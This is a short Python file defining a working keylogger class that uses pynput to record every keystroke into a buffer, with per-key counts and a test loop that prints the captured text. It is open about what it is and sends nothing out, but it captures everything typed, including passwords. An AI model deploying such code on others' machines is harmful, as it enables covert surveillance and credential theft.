from pynput import keyboard
import time
import threading
from datetime import datetime

class KeyLogger:
    def __init__(self):
        self.buffer = []
        self.key_counts = {}
        self.is_running = False
        self.lock = threading.Lock()
        self.listener = None

    def on_press(self, key):
        try:
            # Alphanumeric keys
            k = key.char
        except AttributeError:
            # Special keys
            k = str(key) # e.g. Key.space
        
        with self.lock:
            self.buffer.append(k)
            self.key_counts[str(k)] = self.key_counts.get(str(k), 0) + 1

    def start(self):
        if self.is_running:
            return
        
        self.is_running = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        print("Keylogger started.")

    def stop(self):
        if not self.is_running:
            return
            
        self.is_running = False
        if self.listener:
            self.listener.stop()
        print("Keylogger stopped.")

    def flush(self):
        """
        Returns the current buffer as a string and clears it.
        Also returns key_counts map.
        """
        with self.lock:
            if not self.buffer:
                return None, {}
            
            # Simple concatenation for readability
            content = "".join([str(x) for x in self.buffer])
            counts = self.key_counts.copy()
            
            self.buffer = []
            self.key_counts = {}
            return content, counts

if __name__ == "__main__":
    # Test
    kl = KeyLogger()
    kl.start()
    try:
        print("Type something... (Press Ctrl+C to stop)")
        while True:
            time.sleep(5)
            data = kl.flush()
            if data:
                print(f"Captured: {data}")
    except KeyboardInterrupt:
        kl.stop()
